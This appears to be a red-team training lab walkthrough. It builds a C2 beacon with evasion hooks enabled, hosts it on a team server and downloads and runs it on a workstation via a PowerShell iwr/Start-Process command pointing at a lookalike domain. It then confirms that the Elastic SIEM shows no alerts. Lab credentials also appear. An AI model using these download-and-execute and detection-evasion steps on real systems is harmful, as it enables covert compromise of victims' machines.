# Enable hooks

1. Open _C:\Tools\Crystal-Kit_ in VSCode.
2. Open _udrl > pico.spec_.
3. Uncomment every _addhook_ and _attach_ command.
4. Save the changes.

# Build & test payload

1. Generate a new payload.
    
    1. **Payloads > Windows Stageless Payload**.
    2. Select the HTTP listener.
    3. Click **Generate**.
    4. Save to _C:\Payloads\beacon_x64.exe_.
2. Host the payload on the Team Server's web server.
    
    1. **Site Management > Host File**
    2. File: C:\Payloads\beacon_x64.exe.
    3. Local URI: /beacon_x64.exe.
    4. Click **Launch**.
3. Switch to [Workstation 1](https://labclient.labondemand.com/Instructions/a7e5d69d-c568-42b1-b017-c7533a5c6559#) and login with Passw0rd!.
    
4. Download and execute the payload.
```
iwr -Uri "http://www.bleepincomputer.com/beacon_x64.exe" -OutFile "C:\Users\pchilds\Downloads\beacon_x64.exe"
Start-Process -FilePath "C:\Users\pchilds\Downloads\beacon_x64.exe"
```
    
5. Leave the Beacon running for a few minutes.
    
6. Open Edge and browse to https://10.10.120.200:5601.
    
7. Login with elastic as both the username and password.
    
8. From the menu on the left, click **Alerts** under the **Security** heading.
    
    > You shouldn't see any alerts!